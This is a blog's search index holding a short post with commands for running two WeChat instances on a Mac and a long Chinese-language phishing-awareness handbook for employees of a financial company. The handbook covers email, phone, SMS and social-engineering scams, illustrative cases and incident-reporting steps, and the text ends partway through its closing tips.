<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Mac微信双开方法</title>
    <link href="/2025/09/26/Mac%E5%BE%AE%E4%BF%A1%E5%8F%8C%E5%BC%80/"/>
    <url>/2025/09/26/Mac%E5%BE%AE%E4%BF%A1%E5%8F%8C%E5%BC%80/</url>
    
    <content type="html"><![CDATA[<p>还是让我找到了Mac微信双开的办法，所需命令如下</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">1、复制微信应用：<br>sudo cp -R <span class="hljs-string">/Applications/WeChat.app</span> <span class="hljs-string">/Applications/WeChat2.app</span><br>2、修改 Bundle ID：<br>sudo <span class="hljs-string">/usr/libexec/PlistBuddy</span> -c <span class="hljs-string">&quot;Set :CFBundleIdentifier com.tencent.xinWeChat2&quot;</span> <span class="hljs-string">/Applications/WeChat2.app/Contents/Info.plist</span><br>3、重新签名应用：<br>sudo codesign <span class="hljs-params">--force</span> <span class="hljs-params">--deep</span> <span class="hljs-params">--sign</span> - <span class="hljs-string">/Applications/WeChat2.app</span><br></code></pre></td></tr></table></figure><p>然后去应用程序里找WeChat2即可，其实本质上就是重新复制了一个新的微信仅此而已，<strong>微信4.1.0.34亲测有效</strong></p><p><img src="https://img1.plumstar.cn/upload520250926135945164.png" alt="CleanShot 2025-09-26 at 13.58.56@2x"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Mac使用</tag>
      
      <tag>微信</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>钓鱼防范手册</title>
    <link href="/2025/09/11/%E9%92%93%E9%B1%BC%E9%98%B2%E8%8C%83%E6%89%8B%E5%86%8C/"/>
    <url>/2025/09/11/%E9%92%93%E9%B1%BC%E9%98%B2%E8%8C%83%E6%89%8B%E5%86%8C/</url>
    
    <content type="html"><![CDATA[<blockquote><p>去年给公司写的钓鱼防范手册，有更简练的PDF供日常员工阅读，这版字数多的是我内部培训时使用<br>因为当时有较多钓鱼邮件被邮件网关拦截和员工反应有较多钓鱼邮件和电话，加之原本钓鱼防范手册过于简单，故重写钓鱼防范手册</p></blockquote><h1 id="第1章-认识钓鱼攻击：我们最大的威胁之一"><a href="#第1章-认识钓鱼攻击：我们最大的威胁之一" class="headerlink" title="第1章 认识钓鱼攻击：我们最大的威胁之一"></a><strong>第1章 认识钓鱼攻击：我们最大的威胁之一</strong></h1><h2 id="1-1-什么是钓鱼攻击？"><a href="#1-1-什么是钓鱼攻击？" class="headerlink" title="1.1 什么是钓鱼攻击？"></a><strong>1.1 什么是钓鱼攻击？</strong></h2><p> 钓鱼攻击是一种利用人性弱点而非技术漏洞的网络欺诈手段。攻击者通过精心伪装的通信方式——如电子邮件、即时消息、短信或电话——冒充您信任的个人或机构（如公司高管、IT部门、银行、知名供应商或监管机构），诱骗您执行危险操作。这些操作包括点击指向恶意软件的链接、下载包含病毒的附件、或在伪造的登录页面上输入账号、密码、短信验证码等敏感信息。攻击者的核心策略是利用人们的信任感、紧迫感、好奇心或恐惧心理，绕过所有技术防护措施，直接从“人”这一环节实现突破。</p><p><strong>典型案例：2020年推特比特币骗局</strong></p><p> 攻击者通过电话钓鱼手段获取了推特员工的内部系统凭据，随后接管了多个知名账号（包括奥巴马、比尔·盖茨、巴菲特等），发布”将比特币发送至指定地址，将双倍返还”的推文，在短短几小时内骗取价值超过10万美元的比特币。此案例证明，即使是最科技的公司，也难逃人为因素导致的安全漏洞。</p><h2 id="1-2-为什么金融行业是重点目标？"><a href="#1-2-为什么金融行业是重点目标？" class="headerlink" title="1.2 为什么金融行业是重点目标？"></a><strong>1.2 为什么金融行业是重点目标？</strong></h2><p> 金融行业是数据与资金的核心枢纽，自然成为攻击者眼中的”高价值目标”。其吸引力具体体现在：</p><ul><li><strong>攻击回报率高：</strong> 金融行业攻击成功直接掌控大量资金和大量金融合作行业资料，一次成功的商务邮件诈骗（BEC）可能导致数百万资金瞬间被转移至海外账户，追回极其困难。</li><li><strong>数据金矿：</strong> 持有海量高敏感数据，包括客户身份信息、资产状况、投资偏好、交易记录、信贷数据等。这些数据在黑市上售价高昂，可用于精准诈骗、身份盗窃或其他犯罪活动。</li><li><strong>严格的监管要求：</strong> 金融行业受严格监管，攻击者常冒充监管机构发送”处罚通知”或”合规检查”要求，利用员工对权威的畏惧心理使其匆忙行事，不加核实。</li><li><strong>公开信息丰富：</strong> 公司官网、高管在行业论坛的演讲、员工在领英等社交平台的资料，都为攻击者实施”鱼叉式钓鱼”提供了免费的情报来源，使其诱饵极具欺骗性。</li><li><strong>品牌与声誉敏感：</strong> 金融行业的信任度极其重要，即使是小规模的信息泄露或诈骗成功，也可能引发客户恐慌及信誉受损，攻击者正是利用这种名誉的敏感性加大威胁和勒索筹码。</li><li><strong>员工防范意识淡薄：</strong> 在金融行业中，大部分员工并非信息科技专业人员，对计算机和网络安全知识了解有限，日常工作中往往忽视基本的安全规范（如不定期修改密码、随意点击邮件附件或链接）。这类松懈的安全习惯极易被不法分子利用，导致钓鱼邮件、社工欺诈等攻击成功率上升，从而可能造成客户信息泄露、账户被盗用，甚至影响金融机构整体的业务连续性与声誉。</li></ul><h2 id="1-3-攻击者的目标是什么？"><a href="#1-3-攻击者的目标是什么？" class="headerlink" title="1.3 攻击者的目标是什么？"></a><strong>1.3 攻击者的目标是什么？</strong></h2><p>攻击者的最终目标是牟取非法利益，其具体途径包括：</p><ul><li><strong>直接财务窃取：</strong> 通过欺诈性转账指令盗取公司资金，或通过获取的支付凭证盗用客户资产。</li><li><strong>窃取商业机密：</strong> 获取未公开的财务报告、并购计划、投资策略、算法模型等，用于内幕交易、商业竞争或出售。</li><li><strong>构建攻击跳板：</strong> 以普通员工或高管的电脑为初始入口，横向移动渗透至核心系统（如交易系统、数据库），进行长期潜伏和更大规模的窃取。</li><li><strong>身份伪装与欺诈：</strong> 盗用员工邮箱账号权限，进一步向内部其他同事、客户或合作伙伴发送欺诈邮件，形成连锁反应，破坏信任链条。</li><li><strong>破坏系统与勒索：</strong> 部署勒索软件，加密公司重要文件，以此要挟支付巨额赎金。</li></ul><p><strong>典型案例：2023年某证券公司勒索软件事件</strong></p><p> 一名员工点击了伪装成客户询价的恶意邮件附件，附件内包含勒索软件，点击立即执行恶意软件，导致勒索软件在内部网络扩散，加密了交易系统和客户数据库。攻击者要求支付1000万元比特币赎金，公司业务瘫痪三天，最终虽未支付赎金，但数据恢复和业务中断损失巨大。</p><h1 id="第2章-电子邮件钓鱼：识别与防范"><a href="#第2章-电子邮件钓鱼：识别与防范" class="headerlink" title="第2章 电子邮件钓鱼：识别与防范"></a><strong>第2章 电子邮件钓鱼：识别与防范</strong></h1><h2 id="2-1-普通钓鱼与鱼叉式钓鱼"><a href="#2-1-普通钓鱼与鱼叉式钓鱼" class="headerlink" title="2.1 普通钓鱼与鱼叉式钓鱼"></a><strong>2.1 普通钓鱼与鱼叉式钓鱼</strong></h2><ul><li><strong>普通钓鱼（Spam Phishing）：</strong> 采用广撒网的策略，内容泛泛且模板化，如”您的账户存在异常，请立即登录验证”、”恭喜您获奖，请点击领取”。虽然数量庞大，但因缺乏针对性，较容易通过警惕性和垃圾邮件过滤器识别。</li><li><strong>鱼叉式钓鱼（Spear Phishing）：</strong> 这是针对特定个人或小群体（如高管团队、财务部、人力资源部）的高度定制化攻击。攻击者会花费大量时间研究目标，其在社交媒体上的动态、公司新闻稿、组织架构等都会成为制作诱饵的素材。邮件内容极具相关性，例如：”张总，您刚才在XX金融峰会上的演讲非常精彩，这是您要的会议纪要草案”，附上一个带有病毒的Word文档。其伪装极其逼真，成功率远高于普通钓鱼。</li></ul><p><strong>典型案例：2022年某资管公司财务欺诈案</strong><br> 攻击者通过领英研究了该公司CFO的言行习惯，然后注册了极相似的邮箱域名，向财务总监发送邮件：”赵总监，请立即处理一笔紧急并购保证金付款，详情见附件。此事需保密，手续后补。”附件是一个带有密码的压缩文件，解压后运行其中的”付款说明.exe”，实则木马程序，最终导致公司损失2800万元。</p><h2 id="2-2-鱼叉式钓鱼深度解析：针对高管的精准陷阱"><a href="#2-2-鱼叉式钓鱼深度解析：针对高管的精准陷阱" class="headerlink" title="2.2 鱼叉式钓鱼深度解析：针对高管的精准陷阱"></a><strong>2.2 鱼叉式钓鱼深度解析：针对高管的精准陷阱</strong></h2><p><strong>典型案例详析：</strong></p><p> 2023年末，某基金公司投资总监李总收到一封发自”王董事长”的邮件。邮件主题为：”急事，速办！”。邮件正文写道：”李总，我正在与对方谈一个紧急的投资协议，需要立即支付一笔¥985,000的保证金至以下账户（账户信息：xxx银行，xxx户名，xxx账号）。此事涉及商业机密，请单独优先处理，手续后补。转账成功后邮件回复我即可，无需电话，我仍在会议中。”</p><p><strong>攻击手法拆解：</strong></p><ol><li><strong>情报收集：</strong> 攻击者通过领英掌握了公司高管姓名、架构，通过新闻了解到公司近期投资动态，从而编造了合情合理的业务场景。</li><li><strong>伪造发件人：</strong> 显示名设为”王董事长”，邮箱地址为<code>wangcha0rman@company.com</code>（用数字0替代了字母o），极具迷惑性。</li><li><strong>心理操控：</strong> <strong>权威性：</strong> 冒充最高领导，利用下属通常不会质疑上司的心理。 <strong>紧急性：</strong> “急事”、”速办”、”会议中”等词制造压力，迫使对方快速行动，放弃思考。 <strong>保密性：</strong> “单独处理”、”手续后补”诱导受害者打破常规财务流程。 <strong>抑制核实：</strong> “无需电话”直接封死了最有效的核实渠道。</li></ol><h2 id="2-3-【重点】如何识别可疑邮件？"><a href="#2-3-【重点】如何识别可疑邮件？" class="headerlink" title="2.3 【重点】如何识别可疑邮件？"></a><strong>2.3 【重点】如何识别可疑邮件？</strong></h2><p> 所有员工都应养成审视邮件的习惯，请对以下特征保持​<strong>​高度警惕​</strong>​：</p><p><strong>1. 识别可疑邮件</strong></p><ul><li><strong>发件人邮箱</strong>：检查是否与官方域名一致，注意细微差别（如<code>@paypa1.com</code>替代<code>@paypal.com</code>）。</li><li><strong>主题与内容</strong>：过于紧急（如“立即处理”“账户冻结”）、承诺利益（如“中奖通知”）或带有恐吓威胁的邮件，要特别谨慎。</li><li><strong>语气与格式</strong>：钓鱼邮件常出现语法错误、生硬翻译、非正式称呼。</li></ul><p><strong>2. 处理附件与链接</strong></p><ul><li>不要随意点击邮件中的超链接，先将鼠标悬停在链接上，查看真实跳转地址。</li><li>避免直接打开未知来源的压缩包、可执行文件（.exe&#x2F;.bat&#x2F;.scr）或宏文档（.docm&#x2F;.xlsm）。</li><li>需要下载时，优先通过 <strong>公司内网或官方网站</strong> 获取。</li></ul><p><strong>3. 验证可疑信息</strong></p><ul><li>收到涉及转账、合同、监管通知等敏感邮件时，<strong>通过电话或内部系统二次确认</strong>，不要依赖邮件回复。</li><li>对于“领导紧急指令”“财务转账指示”，要走正规审批流程，切勿因“怕得罪人”而跳过验证。</li></ul><p><strong>4.  账号与密码管理</strong></p><ul><li>不在邮件中输入公司账号、VPN口令、网银密码等敏感信息。</li><li>使用 <strong>强密码 + 多因素认证（MFA）</strong>，即使凭证泄露也能降低风险。</li></ul><p><strong>5 . 保持警觉习惯</strong></p><ul><li>养成“零信任”心态：任何要求输入凭证、下载文件、跳转外链的邮件都先怀疑。</li><li>定期学习最新的钓鱼案例和了解最新钓鱼信息，提高安全意识。</li></ul><p><strong>【高管专属警惕清单】</strong></p><p> 高管因其权限巨大，更需谨记：</p><ul><li><strong>任何涉及资金转移的指令</strong>，无论金额大小、无论来自”董事长”还是”CFO”，<strong>必须</strong>通过线下已知号码电话或当面进行二次确认。<strong>邮件本身不能作为执行转账的唯一依据。</strong></li><li><strong>任何索要员工花名册、客户清单、财务报告等敏感数据的请求</strong>，必须核实请求者的真实身份和正当目的。</li><li><strong>警惕”内部投诉”、”法律传票”、”监管问询”等主题邮件</strong>，攻击者可能利用您维护公司声誉的心理诱导您点击恶意链接。</li></ul><h2 id="2-4-【重点】收到可疑邮件怎么办？（”三不一动”原则）"><a href="#2-4-【重点】收到可疑邮件怎么办？（”三不一动”原则）" class="headerlink" title="2.4 【重点】收到可疑邮件怎么办？（”三不一动”原则）"></a><strong>2.4 【重点】收到可疑邮件怎么办？（”三不一动”原则）</strong></h2><ul><li><strong>不点击：</strong> 绝对不要点击邮件中的任何链接、按钮或图片。</li><li><strong>不下载：</strong> 绝对不要下载、打开或运行任何附件。</li><li><strong>不回复：</strong> 绝对不要回复该邮件，即使是为了质问对方，这只会确认您的邮箱是活跃的。</li><li><strong>一动：立即报告！</strong> 这是最重要的一步。不要自行处理或删除邮件。请立即按照第5章所述的应急响应流程，<strong>打电话</strong>给信息安全部，并将原始邮件<strong>作为附件</strong>转发给指定邮箱，以供专业分析。</li></ul><p><strong>典型案例：2023年某期货公司员工成功处置案例</strong><br> 交易员小王收到”IT部门”发来的”系统升级通知”邮件，要求点击链接更新交易软件。小王察觉发件人邮箱可疑，立即拨打安全部热线。经查，该链接指向境外钓鱼网站。因报告及时，安全部门迅速全网预警，阻止了潜在的大面积感染。</p><h1 id="第3章-电话与短信钓鱼（Vishing-Smishing）"><a href="#第3章-电话与短信钓鱼（Vishing-Smishing）" class="headerlink" title="第3章 电话与短信钓鱼（Vishing &amp; Smishing）"></a><strong>第3章 电话与短信钓鱼（Vishing &amp; Smishing）</strong></h1><h2 id="3-1-假冒公职人员（警方-检察院-法院-监管机构）"><a href="#3-1-假冒公职人员（警方-检察院-法院-监管机构）" class="headerlink" title="3.1 假冒公职人员（警方&#x2F;检察院&#x2F;法院&#x2F;监管机构）"></a><strong>3.1 假冒公职人员（警方&#x2F;检察院&#x2F;法院&#x2F;监管机构）</strong></h2><ul><li><strong>手法详解：</strong> 这是针对金融从业人员最具威胁性的电话钓鱼手法之一。攻击者利用人们对公权力的敬畏心理和對司法程序的陌生感，实施精准诈骗。常见剧本包括：</li><li><strong>涉嫌洗钱&#x2F;诈骗案调查：</strong> 冒充”市公安局经侦支队”或”反诈中心”，准确报出您的姓名、身份证号甚至工号，声称您的银行账户或您经手的业务涉嫌重大洗钱、诈骗案件，要求您”配合调查”。为”证明清白”，需要您提供账户信息、密码、短信验证码，或将资金转入所谓的”安全账户”进行”资金清查”。∙<strong>传票&#x2F;法律文书送达：</strong> 冒充”法院”或”检察院”，称您或公司有传票未领取、涉嫌某起经济案件，要求您点击短信中的链接查阅电子传票，或下载附件中的”起诉书”（实为木马文件）。</li><li><strong>监管处罚与合规检查：</strong> 冒充”银保监会”、”证监会”或”中国人民银行”的执法人员，以”现场检查发现严重问题”、”接到客户投诉需立案处理”为由，要求您立即通过QQ、微信等外部渠道提供内部资料、数据报表，或缴纳”罚款”。</li><li><strong>关键特征：</strong>∙能准确说出您的部分个人信息，增加可信度（这些信息可能来自之前的数据泄露）。语气强硬、严厉，制造巨大的心理压力和紧迫感，让你无暇思考。∙要求绝对保密，不能与同事、家人透露，以此隔绝你获取他人帮助的可能。∙最终目的都是索要敏感信息、要求转账，或让你在设备上安装远程控制软件&#x2F;访问钓鱼网站。</li></ul><p><strong>典型案例：2023年某银行理财经理”涉嫌洗钱”案</strong></p><p>理财经理小王接到自称”上海市公安局经侦总队李警官”的电话，对方准确报出了其姓名、身份证号和职业，称其日常使用的公司的一张银行卡被卷入一宗特大跨境洗钱案，要求其立即”配合秘密调查”。为”排除嫌疑”，需要其提供公司相关敏感信息配合调查，并强调此事涉及国家机密，不得告知任何人，包括同事和领导。小王在极度恐慌下，险些按要求操作，最后因想起安全培训内容，拨打公司安全热线核实后才避免上当。</p><h2 id="3-2-假冒技术支持"><a href="#3-2-假冒技术支持" class="headerlink" title="3.2 假冒技术支持"></a><strong>3.2 假冒技术支持</strong></h2><ul><li>∙<strong>手法详解：</strong> 攻击者通常会声称来自”IT支持中心”、”系统运维部”或”微软&#x2F;银行客服”。他们谎称：”监测到您的电脑正在向网络发送病毒”、”您的OA账户出现异常登录”、”需要为您紧急安装安全补丁”。随后会要求您：∙提供您的用户名和密码用于”验证”或”重置”。∙访问一个伪造的内部登录页面（如VPN门户）输入凭证。∙在电脑上安装AnyDesk、TeamViewer等远程控制软件，从而直接操控您的电脑。</li></ul><p><strong>典型案例：2022年某银行分行远程控制事件</strong></p><p>攻击者冒充”总行科技部”致电分行员工，称其电脑中毒需远程清理。员工按要求安装了远程控制软件，攻击者在操作过程中暗中安装了键盘记录器，窃取了多名员工的银行系统密码，最终导致客户资金被盗。</p><h2 id="3-3-假冒合作伙伴-客户"><a href="#3-3-假冒合作伙伴-客户" class="headerlink" title="3.3 假冒合作伙伴&#x2F;客户"></a><strong>3.3 假冒合作伙伴&#x2F;客户</strong></h2><ul><li>∙<strong>手法详解：</strong> 攻击者冒充与公司有业务往来的合作伙伴、律所、会计师事务所或重要客户，以”紧急项目”、”合同款支付”、”数据核对”等为由，通过短信或电话要求您：∙更改收款账户信息。∙提供项目相关的敏感内部数据。∙点击链接登录所谓的”合作平台”签署文件或查看详情。</li></ul><p><strong>典型案例：2024年某基金公司假冒律所事件</strong></p><p>攻击者冒充长期合作的律师事务所，给基金运营部发短信称：”根据最新监管要求，本所银行账户信息已变更，请参考链接内的最新通知，即刻起所有付款请付至新账户。”幸而被多次安全培训的运营总监识破，经电话直接与律所合伙人核实，确认为诈骗。</p><h2 id="3-4-【重点】防范与应对技巧"><a href="#3-4-【重点】防范与应对技巧" class="headerlink" title="3.4 【重点】防范与应对技巧"></a><strong>3.4 【重点】防范与应对技巧</strong></h2><ul><li>∙<strong>保持冷静，破除恐惧：</strong> 这是最关键的第一步。所有公检法机关办案都有严格的法律程序，绝不会通过电话、QQ、微信等社交工具办案，也<strong>根本不存在所谓的”安全账户”</strong>。一旦对方以涉嫌犯罪为由恐吓您并要求转账或索要密码，100%是诈骗。</li><li>∙<strong>主动且独立核实：</strong> 挂断电话。通过官方渠道（如拨打110、或使用公司通讯录&#x2F;官网上的电话）主动回拨过去，验证刚才通话的真实性。<strong>切勿使用对方提供的或来电显示的回拨号码。</strong></li><li>∙<strong>牢记原则：</strong>∙真正的公职人员、IT人员、同事<strong>绝不会</strong>通过电话、短信索要您的<strong>密码、短信验证码</strong>。∙公司<strong>绝不会</strong>要求员工向个人账户或不明账户转账。任何要求您<strong>断开与外界联系、保密</strong>的电话，都是诈骗的标志。</li><li>∙<strong>官方渠道验证：</strong> 监管机构、法院的通知一定会通过官方正式公文渠道传达，绝不会以个人手机号发送短信或打电话要求立即办理。</li><li>∙<strong>立即报告：</strong> 无论是否上当，收到此类电话或短信后，都应立即按照第5章流程向公司信息安全部报告。您的信息可能帮助公司预警，保护其他同事。</li></ul><h2 id="3-5-深度伪造语音（AI诈骗）预警"><a href="#3-5-深度伪造语音（AI诈骗）预警" class="headerlink" title="3.5 深度伪造语音（AI诈骗）预警"></a><strong>3.5 深度伪造语音（AI诈骗）预警</strong></h2><ul><li><p>∙<strong>最新威胁：</strong> 随着AI技术发展，攻击者可能利用公开视频会议中的音频，通过AI合成特定人员（如高管、合作伙伴）的语音，通过电话实施诈骗。例如，模仿CFO的声音给财务人员打电话，要求紧急付款。</p></li><li><p>∙<strong>应对措施：</strong></p><ol><li><p><strong>建立二次验证密语：</strong> 对于关键业务指令（如转账），可通过事先约定的、不易被猜到的密语进行验证。</p></li><li><p><strong>多因素确认：</strong> 通过多种独立渠道确认指令真实性（如接到语音电话后，通过企业微信或电话再次向本人确认）。</p></li><li><p><strong>提高警惕：</strong> 意识到技术带来的新风险，对任何仅通过语音发出的异常指令保持极高警惕。</p></li><li><p>**谨慎操作：**对于敏感的操作例如汇款、修改密码等操作，不轻信电话、语音等消息来源，请多方确认，例如电话+邮件+工单+内部OA多方确认方可进行操作。</p></li></ol></li></ul><h1 id="第4章-社交工程防范：人心是最薄的防线"><a href="#第4章-社交工程防范：人心是最薄的防线" class="headerlink" title="第4章 社交工程防范：人心是最薄的防线"></a><strong>第4章 社交工程防范：人心是最薄的防线</strong></h1><h2 id="4-1-什么是社交工程？"><a href="#4-1-什么是社交工程？" class="headerlink" title="4.1 什么是社交工程？"></a><strong>4.1 什么是社交工程？</strong></h2><p> 社交工程是一种”黑客艺术”，它通过人际交流中的欺骗、影响和操纵来获取信息或访问权限。它不攻击系统，而是攻击系统的使用者。攻击者会伪装成同事、供应商、新员工、IT支持甚至高管，通过聊天、求助、套近乎等方式，让您在毫无戒备的情况下泄露信息或授予权限。</p><p><strong>典型案例：2019年某保险集团社交工程渗透</strong></p><p> 攻击者伪装成快递员进入办公大楼，然后冒充IT人员到各部门”检修网络”，趁机在多名员工电脑上安装窃密软件，最终获取了大量客户保单信息和内部定价策略。</p><h2 id="4-2-常见手法"><a href="#4-2-常见手法" class="headerlink" title="4.2 常见手法"></a><strong>4.2 常见手法</strong></h2><ul><li><strong>领英&#x2F;微信伪装：</strong> 攻击者伪造一个完美的职业档案，添加您为好友，在逐渐取得信任后，开始询问：”对了，你们公司负责XX系统的是哪位同事呀？我想请教个技术问题。” 或”这个项目真好，能分享一下你们内部的方案模板吗？”</li><li><strong>假冒新员工&#x2F;实习生：</strong> 冒充刚入职的新人，向相邻工位的同事”求助”：”王哥，我的账户好像权限不对，访问不了共享盘，能把你那个文件发我邮箱一份吗？”</li><li><strong>尾随（Piggybacking）：</strong> 在您刷卡进入门禁时，假装忘带门卡，十分自然地跟着您进入办公区域。</li><li><strong>交换名片&#x2F;资料：</strong> 在行业会议中，通过交换U盘、名片或资料的方式，传递带有恶意软件的存储设备。</li></ul><p><strong>典型案例：2022年某私募基金信息泄露事件</strong></p><p> 攻击者伪装成同行研究员，在行业会议上与基金经理交换了带有恶意软件的U盘（标签为”行业研究报告”）。基金经理在办公室电脑上打开U盘后，木马程序自动安装，导致木马在内网大规模传播，导致大量投资策略和交易记录被窃。</p><h2 id="4-3-【重点】如何保护自己和公司信息？"><a href="#4-3-【重点】如何保护自己和公司信息？" class="headerlink" title="4.3 【重点】如何保护自己和公司信息？"></a><strong>4.3 【重点】如何保护自己和公司信息？</strong></h2><p><strong>1. 最小信息原则</strong></p><ul><li>在任何场景下，仅提供完成任务所需的最小化信息。</li><li>对信息敏感度进行分级（如“公开”“内部”“敏感”“机密”），不同级别严格区分传递范围。</li></ul><p><strong>2. 验证身份</strong></p><ul><li>对提出请求的人或组织进行多渠道验证（如公司邮箱、官方电话、视频会议确认）。</li><li>特别注意“紧急请求”“领导指令”“监管通知”等场景，避免因权威或压力而跳过验证。</li></ul><p><strong>3. 遵守流程</strong></p><ul><li>严格通过公司批准的渠道共享信息（如内部文件服务器、加密邮件、VPN访问）。</li><li>禁止通过私人邮箱、社交软件、U盘等不受控渠道传递公司敏感数据。</li><li>对涉及财务、客户信息、系统访问权限的请求，必须有书面或系统内的审批记录。</li></ul><p><strong>4. 物理安全警惕</strong></p><ul><li>出入办公区时，确保门禁卡不被尾随进入者利用。</li><li>对陌生访客保持礼貌但谨慎的态度，必要时引导其到前台或安保处。</li><li>对含敏感信息的纸质文件、移动介质（U盘、硬盘），离开座位时应妥善保管或加锁存放。</li></ul><p><strong>5. 提升安全意识</strong></p><ul><li>定期接受安全意识培训，学习最新的钓鱼、社工案例。</li><li>鼓励员工形成“零信任”习惯：对任何不寻常的请求保持怀疑。</li><li>建立简便的 <strong>可疑事件报告机制</strong>（如安全邮箱&#x2F;热线），确保员工在遇到疑似社工攻击时第一时间上报。</li></ul><p><strong>典型案例：2023年某券商员工成功防范案例</strong></p><p> 研究员小李在领英上收到”同行”添加请求，对方在聊天中不断打听公司研究框架和内部数据来源。小李警觉后，通过公司邮箱向该机构官方邮箱核实，发现无此人存在，成功避免信息泄露。</p><h1 id="第5章-【重点】应急响应流程：发现可疑，立即行动！"><a href="#第5章-【重点】应急响应流程：发现可疑，立即行动！" class="headerlink" title="第5章 【重点】应急响应流程：发现可疑，立即行动！"></a><strong>第5章 【重点】应急响应流程：发现可疑，立即行动！</strong></h1><p>时间就是金钱，在安全事件中，时间能阻止损失。请将以下流程肌肉记忆化：</p><h2 id="5-1-第一步：立即停止任何行动"><a href="#5-1-第一步：立即停止任何行动" class="headerlink" title="5.1 第一步：立即停止任何行动"></a><strong>5.1 第一步：立即停止任何行动</strong></h2><ul><li>立即停止与可疑邮件、电话、短信或人员的任何互动。如果正在通话，礼貌地挂断电话；如果正在查看邮件，不要再进行任何操作。</li><li><strong>如果攻击已经发生，也请立即停止任何行动并第一时间拨打信息安全部7x24小时值班电话，听从安全人员指挥，切莫擅自行动造成更严重的损失。</strong></li><li><strong>请牢记，信息安全无小事，宁可错报也不可不报</strong></li><li><strong>切记不要因为害怕被问责而隐瞒真相，否则损失只会更大，责任也会到一个无法估量的地步</strong></li></ul><p><strong>典型案例：2024年1月某财务人员及时止损</strong></p><p> 财务小张收到”CEO”要求紧急付款的邮件，正准备操作时想起安全培训内容，立即停止操作并报告。后经核实为钓鱼邮件，避免了50万元损失。</p><h2 id="5-2-第二步：立即报告！（Call-Ticket-email-三线报告）"><a href="#5-2-第二步：立即报告！（Call-Ticket-email-三线报告）" class="headerlink" title="5.2 第二步：立即报告！（Call &amp; Ticket &amp; email 三线报告）"></a><strong>5.2 第二步：立即报告！（Call &amp; Ticket &amp; email 三线报告）</strong></h2><p> 这是​<strong>​强制性的规定动作​</strong>​，请您务必严格执行：</p><ol><li><strong>CALL（首要动作）：</strong> <strong>立即拨打信息安全部7x24小时值班电话</strong>。这是最快速、最直接的途径。安全工程师可以立即启动监控和阻断措施，防止危害扩散。通话时请清晰说明：”我发现一个可疑邮件&#x2F;电话，发件人是XXX，主题是XXX。”</li><li><strong>TICKET（后续跟进）：</strong> <strong>对于邮件：</strong> 将可疑邮件<strong>作为附件完整转发</strong>至安全组邮箱。<strong>（重要：务必选择”作为附件转发”，而不是直接转发，这样可以避免误点击邮件中的恶意链接）</strong>。 <strong>对于短信&#x2F;电话：</strong> 立即在内部工单系统中创建新工单，分类为”安全事件”，详细描述事件经过（时间、来电号码、对方声称的身份、谈话内容、要求等）。</li><li>**Email（邮件通知）：**将工单编号和详细经过在邮件中交代完全，如有附件请选择作为附件转发，尽可能详细描述事件情况，方便后续追查处理。</li></ol><p><strong>典型案例：2023年某分公司协同防御</strong></p><p>北京分公司员工收到钓鱼邮件后立即上报给信息安全部后，安全部门10分钟内全国公司内部预警，阻止了上海、广州分公司多名员工点击同一批钓鱼邮件，实现协同防御。</p><h2 id="5-3-第三步：配合调查与事后处理"><a href="#5-3-第三步：配合调查与事后处理" class="headerlink" title="5.3 第三步：配合调查与事后处理"></a><strong>5.3 第三步：配合调查与事后处理</strong></h2><ul><li>安全部门的同事可能会联系您了解更详细的细节，请耐心配合，您的信息对追踪攻击源至关重要。</li><li><strong>如果您的密码可能已经泄露，或您已经点击了链接&#x2F;附件：</strong> <strong>立即告知接听电话的安全工程师这一情况。</strong> <strong>立即在另一台干净的设备上（如手机）更改您的相关系统密码（邮箱、OA、VPN等）。</strong> 配合IT部门对您的电脑进行安全检查或隔离。</li></ul><p><strong>典型案例：2024年某员工中招后妥善处理</strong></p><p> 交易员小刘点击了恶意链接后意识到不对，立即拨打电话报告。安全部门迅速隔离其电脑，指导其更改密码，避免了凭证泄露和进一步损失。</p><hr><h1 id="附录A：常见钓鱼攻击特征快速查询表"><a href="#附录A：常见钓鱼攻击特征快速查询表" class="headerlink" title="附录A：常见钓鱼攻击特征快速查询表"></a><strong>附录A：常见钓鱼攻击特征快速查询表</strong></h1><table><thead><tr><th align="left">攻击媒介</th><th align="left">高度可疑特征</th><th align="left">应立即采取的行动</th></tr></thead><tbody><tr><td align="left"><strong>电子邮件</strong></td><td align="left">发件人地址可疑、紧急&#x2F;威胁语气、要求转账或数据、意外附件、链接指向陌生网址</td><td align="left"><strong>停止操作 -&gt; 立即Call安全部 -&gt; 将邮件作为附件转发上报</strong></td></tr><tr><td align="left"><strong>电话(Vishing)</strong></td><td align="left">索要密码&#x2F;验证码、要求远程控制电脑、指导您禁用安全软件、自称监管机构施加压力</td><td align="left"><strong>礼貌挂断 -&gt; 用已知官方号码回拨核实 -&gt; 立即Call安全部报告</strong></td></tr><tr><td align="left"><strong>短信(Smishing)</strong></td><td align="left">内含链接、冒充官方机构（银行、监管）、要求登录某网站办理业务、发送验证码</td><td align="left"><strong>勿点击 -&gt; 立即Call安全部 -&gt; 截图或转发短信内容上报</strong></td></tr><tr><td align="left"><strong>社交工程</strong></td><td align="left">陌生人套取组织架构、技术信息、业务流程；尾随进入办公区；请求违规发送文件</td><td align="left"><strong>拒绝提供 -&gt; 核实身份 -&gt; 报告可疑行为</strong></td></tr></tbody></table><hr><h1 id="附录B：信息安全部报告渠道与联系方式"><a href="#附录B：信息安全部报告渠道与联系方式" class="headerlink" title="附录B：信息安全部报告渠道与联系方式"></a><strong>附录B：信息安全部报告渠道与联系方式</strong></h1><p><strong>信息安全部7x24小时应急响应热线：</strong></p><ul><li><strong>电话1：【请在此填入安全部7x24小时值班电话】</strong></li><li><strong>电话2：【请在此填入安全部7x24小时值班电话】</strong></li><li><strong>应急电话1：【请在此填入安全部7x24小时值班电话】</strong></li><li><strong>应急电话2：【请在此填入安全部7x24小时值班电话】</strong></li></ul><p><strong>事件上报邮箱：</strong></p><ul><li><strong>邮箱：【请在此填入安全事件上报邮箱】</strong> <em>（请注意：上报可疑邮件时，请务必将其作为附件转发）</em></li></ul><p><strong>内部工单系统：</strong></p><ul><li><strong>路径：【请在此填入内部工单系统具体路径或链接】</strong></li><li><strong>分类：请选择”信息安全事件”</strong></li></ul><p><strong>信息安全部办公地点：</strong></p><ul><li><strong>【请在此填入具体位置】</strong></li></ul><p><strong>温馨提示：</strong> 